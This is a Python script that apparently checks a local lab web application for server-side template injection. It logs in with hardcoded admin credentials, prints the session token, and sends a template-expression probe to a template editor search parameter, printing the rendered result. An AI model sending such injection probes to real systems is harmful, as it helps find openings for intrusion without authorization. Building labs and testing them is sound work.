import requests
import time

TARGET_URL = "http://localhost:5005"
ADMIN_USERNAME = 'admin'
ADMIN_PASSWORD = 'password123'

def verify():
    s = requests.Session()
    
    # Wait for server to start
    for _ in range(10):
        try:
            requests.get(TARGET_URL)
            break
        except:
            time.sleep(1)
            print("Waiting for server...")
    
    # Login as admin
    print("[*] Logging in as admin...")
    try:
        r = s.post(f"{TARGET_URL}/admin/login", data={'username': ADMIN_USERNAME, 'password': ADMIN_PASSWORD})
    except Exception as e:
        print(f"[-] Failed to connect: {e}")
        return
    
    if "admin_token" not in s.cookies:
        print("[-] Failed to get admin_token")
        # Try to see if we are logged in anyway
        if "session" in s.cookies:
            print("[*] Session cookie present.")
        else:
            print("[-] No session cookie either.")
            return

    print("[+] Logged in. Admin Token:", s.cookies.get('admin_token'))
    
    # Debug Payloads
    # Check if request is subscriptable
    ssti_payload = "{{ request['foo'] }}"
    
    print(f"[*] Sending payload: {ssti_payload}")
    params = {'search': ssti_payload}
    
    r = s.get(f"{TARGET_URL}/admin_area/template_editor.php", params=params)
    
    print(f"Response Code: {r.status_code}")
    if r.status_code == 200:
        if "Search Results for:" in r.text:
            parts = r.text.split("Search Results for:")
            if len(parts) > 1:
                result = parts[1].split("</h3>")[0]
                print(f"Rendered Result: {result}")
            else:
                print("Could not parse search results.")
        else:
            print("Search Results header not found.")
            print(r.text[:1000])
    else:
        print("Error Response:")
        print(r.text)

if __name__ == "__main__":
    verify()
